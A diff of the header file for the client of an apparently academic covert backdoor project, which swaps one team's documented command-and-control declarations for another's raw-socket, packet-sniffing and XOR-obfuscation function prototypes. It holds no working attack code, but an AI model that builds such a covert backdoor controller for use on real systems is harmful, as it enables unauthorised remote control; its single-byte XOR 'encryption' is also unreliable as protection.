@@ -1,53 +1,81 @@
+/**
+ * client.h
+ * authors: Shan Bains & Jivanjot Brar
+ */
+
 #ifndef CLIENT_H
 #define CLIENT_H
 
-/*
-SOURCE FILE: client.h
+#include <pcap.h>
+#include <unistd.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <stdbool.h>
+#include <signal.h>
+#include <time.h>
+#include <netdb.h>
+#include <netinet/in.h>
+#include <netinet/tcp.h>
+#include <sys/socket.h>
+#include <arpa/inet.h>
+#include <linux/ip.h>
+#include <sys/prctl.h>
+#include <sys/types.h>
+#include <netinet/if_ether.h>
+#include <net/ethernet.h>
+#include <netinet/ether.h>
+#include <pthread.h>
 
-PROGRAM: Backdoor - A covert backdoor client/server using libpcap and raw sockets.
 
-DATE: November 29, 2011
+// Globals
+char key = 'A';
+char *options[] = { "-dest", "-dest_port", "-source", "-src_port" };
+pcap_t *pd;
+bool running = true;
+FILE *file;
+typedef struct _client client;
+//typedef struct _packets packets;
 
-REVISIONS:
-	1.0 - October 23
-	1.1 - November 29, 2011
+struct _client {
+	unsigned int source_host;
+	unsigned int dest_host;
+	unsigned short source_port;
+	unsigned short dest_port;
+	char srchost[80];
+	char desthost[80];
+};
 
-DESIGNERS:
-	Santana Mach and Steve Stanisic
+static struct _packets {
+	struct iphdr ip;
+	struct tcphdr tcp;
+	//char **data;
+	char data[2000];
+} packets;
 
-PROGRAMMERS:
-	Santana Mach and Steve Stanisic
+static struct _pseudo_header {
+	unsigned int source_address;
+	unsigned int dest_address;
+	unsigned char placeholder;
+	unsigned char protocol;
+	unsigned short tcp_length;
+	struct tcphdr tcp;
+} pseudo_header;
 
-NOTES: This file contains the command and control client functionality.
-*/
+char *xor_encrypt(char *data);
+char *xor_decrypt(char *data);
+void print_usage(char *argv[]);
+client *client_new(void);
+void packet_new(client *, char *msg);
+void validate_args(int argc, char *argv[], client *c);
+bool if_exists(char *array[], char *value);
+void SystemFatal(char *c);
+unsigned int host_convert(char *hostname);
+unsigned short in_cksum(unsigned short *addr, int len);
+void send_packets(client *, char *msg);
+void *sniffer_thread(void *args);
+pcap_t *open_pcap_socket(char *device, const char *filter);
+void parse_packet(u_char *user, struct pcap_pkthdr *packethdr, u_char *packet);
 
-#include "defs.h"
+#endif /* COMMON_H_ */
 
-/*
-FUNCTION: backdoor_client
-
-PARAMS:
-	char *ipaddr: The remote host's ip address.
-	int chan: Protocol for backdoor channel.
-
-RETURN: none.
-
-NOTES: Call this function to start reading commands from standard input
-	and sending them to the backdoor.
-*/
-void backdoor_client(uint32 ipaddr, int chan);
-/*
-FUNCTION: listen_thread
-
-PARAMS:
-	void *arg: (sockaddr_in*) The remote address we are communicating with.
-
-RETURN: none.
-
-NOTES: This thread func is suitable for listening for encrypted
-	responses from the remote host. It will loop until the shutdown
-	variable is set.
-*/
-void *listen_thread(void *arg);
-
-#endif
